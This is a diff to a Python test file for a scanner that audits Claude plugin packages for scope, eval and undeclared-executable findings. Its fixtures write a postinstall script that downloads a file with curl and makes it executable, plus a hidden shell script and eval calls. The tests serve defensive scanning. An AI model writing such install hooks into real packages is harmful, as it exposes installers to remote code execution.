@@ -37,7 +37,7 @@ def _licensed_plugin(
     *,
     name: str = "safe-plugin",
     hook_path: str = "hooks/pre.sh",
-    files: list[str] | None = None,
+    files: list[object] | None = None,
 ) -> Path:
     """Write a pinned licensed plugin with one declared shell hook."""
     manifest: dict[str, object] = {
@@ -131,7 +131,7 @@ def test_files_field_declared_generated_bundle_is_not_this_finding(
     tmp_path: Path,
 ) -> None:
     """``plugin.json`` ``files[]`` binds generated output as declared scope."""
-    root = _licensed_plugin(tmp_path, files=["dist/app.min.js"])
+    root = _licensed_plugin(tmp_path, files=["dist/app.min.js", "", 3])
     generated = root / "dist" / "app.min.js"
     generated.parent.mkdir()
     generated.write_text("console.log(0);\n", encoding="utf-8")
@@ -161,6 +161,24 @@ def test_node_modules_is_one_scope_finding_not_hook_findings(
     hook_vendor = root / "hooks" / "node_modules" / "foo" / "index.js"
     hook_vendor.parent.mkdir(parents=True)
     hook_vendor.write_text("eval('hook-vendor');\n", encoding="utf-8")
+    (root / "node_modules" / "foo" / "package.json").write_text(
+        json.dumps(
+            {
+                "scripts": {
+                    "postinstall": "curl -o x https://example.invalid/x && chmod +x x"
+                }
+            }
+        )
+        + "\n",
+        encoding="utf-8",
+    )
+    hidden = root / "node_modules" / ".bin" / "run.sh"
+    hidden.parent.mkdir()
+    hidden.write_text("#!/bin/sh\neval stealth\n", encoding="utf-8")
+    (root / "node_modules" / "foo" / "SKILL.md").write_text(
+        "---\nname: helper\n---\nUse the helper.\n",
+        encoding="utf-8",
+    )
 
     hits = scan_claude_plugin_package(root)
     receipt = build_claude_plugin_scan_receipt(root)
@@ -169,6 +187,24 @@ def test_node_modules_is_one_scope_finding_not_hook_findings(
     assert _SCOPE_RULE in receipt.finding_summary
     assert _EVAL_RULE not in receipt.finding_summary
     assert _UNDECLARED_RULE not in receipt.finding_summary
+    assert "claude-plugin-hidden-undeclared-executable" not in receipt.finding_summary
+    assert "claude-plugin-unsigned-executable-download" not in receipt.finding_summary
+    assert receipt.scan_result == "fail"
+
+
+def test_non_list_files_field_does_not_declare_scope(tmp_path: Path) -> None:
+    """A string ``files`` value is not a bounded files[] identity."""
+    root = _licensed_plugin(tmp_path, files=None)
+    payload = json.loads(
+        (root / ".claude-plugin" / "plugin.json").read_text(encoding="utf-8")
+    )
+    payload["files"] = "vendor/leftpad.js"
+    _write_json(root / ".claude-plugin" / "plugin.json", payload)
+    vendor = root / "vendor" / "leftpad.js"
+    vendor.parent.mkdir()
+    vendor.write_text("module.exports = 1;\n", encoding="utf-8")
+    receipt = build_claude_plugin_scan_receipt(root)
+    assert _SCOPE_RULE in receipt.finding_summary
     assert receipt.scan_result == "fail"
 
 
